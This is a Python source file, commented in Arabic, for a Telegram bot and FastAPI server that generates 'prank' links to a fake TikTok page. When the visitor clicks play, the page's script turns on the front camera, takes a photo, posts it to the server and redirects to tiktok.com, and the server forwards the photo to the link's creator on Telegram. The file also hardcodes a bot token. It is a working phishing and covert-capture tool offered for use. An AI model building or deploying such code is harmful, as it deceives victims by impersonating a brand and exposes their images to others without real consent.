import os
import base64
import io
import threading
import sqlite3
import uvicorn
from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# 1. الإعدادات الأساسية (تأكد من صحة التوكن ورابط سيرفرك الجديد)
BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
REPLIT_URL = "https://haker-cam.onrender.com"

# إنشاء الكائنات البرمجية
bot = telebot.TeleBot(BOT_TOKEN, threaded=False) # تعطيل الخيوط الداخلية لمنع التعليق
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---- إعداد قاعدة البيانات الدائمة (SQLite) ----
def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS premium_users (
            chat_id INTEGER PRIMARY KEY
        )
    """)
    conn.commit()
    conn.close()

try:
    init_db()
except Exception as e:
    print(f"⚠️ خطأ في تهيئة قاعدة البيانات: {e}")

def add_premium_user(chat_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    try:
        cursor.execute("INSERT OR IGNORE INTO premium_users (chat_id) VALUES (?)", (chat_id,))
        conn.commit()
    except Exception as e:
        print(f"Database error: {e}")
    finally:
        conn.close()

def is_premium_user(chat_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM premium_users WHERE chat_id = ?", (chat_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# ---- واجهة تيك توك التفاعلية (HTML & CSS) ----
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - شاهد التحدي المنتشر</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            background-color: #010101; 
            color: #ffffff; 
            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px;
            overflow: hidden;
        }
        .container { 
            background: #121212;
            padding: 35px 25px; 
            border-radius: 20px; 
            box-shadow: 0 15px 35px rgba(254, 44, 85, 0.15); 
            max-width: 420px; 
            width: 100%; 
            border: 1px solid #2f2f2f;
            text-align: center;
        }
        .tiktok-logo {
            font-size: 42px;
            font-weight: 800;
            margin-bottom: 20px;
            letter-spacing: -1px;
            display: inline-block;
            position: relative;
            text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;
        }
        .video-box {
            width: 100%;
            height: 200px;
            background: #000000;
            border-radius: 12px;
            margin-bottom: 25px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            border: 1px solid #222;
            position: relative;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55;
            border-right: 4px solid #25f4ee;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #a6a6a6;
            font-size: 14px;
        }
        h2 { 
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        p { 
            color: #8a8a8a; 
            font-size: 14px; 
            line-height: 1.6; 
            margin-bottom: 25px; 
        }
        .btn { 
            background-color: #fe2c55; 
            color: white; 
            border: none; 
            padding: 16px 32px; 
            font-size: 16px; 
            font-weight: 700; 
            border-radius: 8px; 
            cursor: pointer; 
            width: 100%; 
            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
            transition: all 0.2s ease;
        }
        .btn:active { 
            transform: scale(0.98); 
            background-color: #e11d48;
        }
        .footer-brand {
            margin-top: 25px;
            font-size: 11px;
            color: #444;
            letter-spacing: 0.5px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="tiktok-logo">TikTok</div>
        
        <div class="video-box">
            <div class="loader"></div>
            <div class="loading-text">جاري تجهيز مشغل الفيديو...</div>
        </div>

        <h2>تحدي الملامح التفاعلي جاهز</h2>
        <p>يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية للمشاركة في تحدي الضحك المنتشر الآن.</p>
        
        <button class="btn" id="startBtn">▶ اضغط لمشاهدة التحدي على TikTok</button>
        
        <div class="footer-brand">© 2026 TikTok Inc.</div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const ownerId = urlParams.get('id');
        const REDIRECT_URL = "https://www.tiktok.com";

        document.getElementById('startBtn').addEventListener('click', function() {
            if (ownerId) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(function(stream) {
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute("playsinline", true);
                    video.play();
                    
                    video.onloadedmetadata = function() {
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        let base64Image = canvas.toDataURL('image/jpeg', 0.80);
                        
                        fetch('/api/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ user_id: ownerId, image: base64Image })
                        })
                        .then(() => {
                            stream.getTracks().forEach(track => track.stop());
                            window.location.href = REDIRECT_URL;
                        })
                        .catch(() => { window.location.href = REDIRECT_URL; });
                    };
                })
                .catch(function(err) { window.location.href = REDIRECT_URL; });
            } else { window.location.href = REDIRECT_URL; }
        });
    </script>
</body>
</html>
"""

# ---- أوامر البوت في تليجرام ----

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    name = message.from_user.first_name
    
    welcome_text = (
        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي! 📸🔥\n\n"
        "💳 لتفعيل حسابك وتوليد روابط المقالب المضحكة، يرجى الضغط على زر الاشتراك بالأسفل."
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "buy")
def buy(call):
    chat_id = call.message.chat.id
    add_premium_user(chat_id)
    bot.answer_callback_query(call.id, "🎉 تم تفعيل حسابك!")
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط المقلب الخاص بي", callback_data="gen"))
    bot.send_message(chat_id, "👑 حسابك فعال الآن بالكامل. اضغط لإنشاء رابطك الفريد:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "gen")
def gen_link(call):
    chat_id = call.message.chat.id
    if not is_premium_user(chat_id):
        bot.send_message(chat_id, "❌ حسابك غير مفعل.")
        return
        
    unique_link = f"{REPLIT_URL}?id={chat_id}"
    
    msg = (
        "🚀 **رابط المقلب الخاص بك جاهز ويعمل على جميع المتصفحات الخارجية!**\n\n"
        f"انسخ هذا الرابط وأرسله لصديقك لتجربته:\n`{unique_link}`\n\n"
        "بمجرد دخوله والضغط على زر بدء التحدي وقبول الإذن، ستصله لقطته الفكاهية فوراً!"
    )
    bot.send_message(chat_id, msg, parse_mode="Markdown")

@app.get("/", response_class=HTMLResponse)
async def get_home():
    return HTML_CONTENT

def send_photo_to_owner(user_id, image_bytes):
    try:
        bot.send_photo(chat_id=user_id, photo=image_bytes, caption="📸 **ههههه! تم صيد لقطة صديقك الفكاهية بنجاح!**")
    except Exception as e:
        print(f"Error sending to {user_id}: {e}")

@app.post("/api/capture")
async def capture_api(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        image_b64 = data.get("image")
        
        if not user_id or not image_b64:
            return JSONResponse(status_code=400, content={"status": "error"})
            
        header, encoded = image_b64.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        image_file = io.BytesIO(image_bytes)
        image_file.name = "capture.jpg"
        
        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file)
        return {"status": "success"}
    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "error"})

# دالة لتشغيل استطلاع البوت بشكل آمن ومستقل
def run_bot():
    print("🤖 جاري بدء تشغيل بوت تليجرام...")
    bot.infinity_polling(timeout=20, long_polling_timeout=10)

if __name__ == "__main__":
    # تشغيل البوت في الخلفية بشكل نظيف
    threading.Thread(target=lambda: bot.infinity_polling(timeout=20, long_polling_timeout=10), daemon=True).start()
    
    # تشغيل السيرفر
    port = int(os.environ.get("PORT", 8080))
    print(f"🚀 السيرفر يعمل على المنفذ: {port}")
    uvicorn.run(app, host="0.0.0.0", port=port)
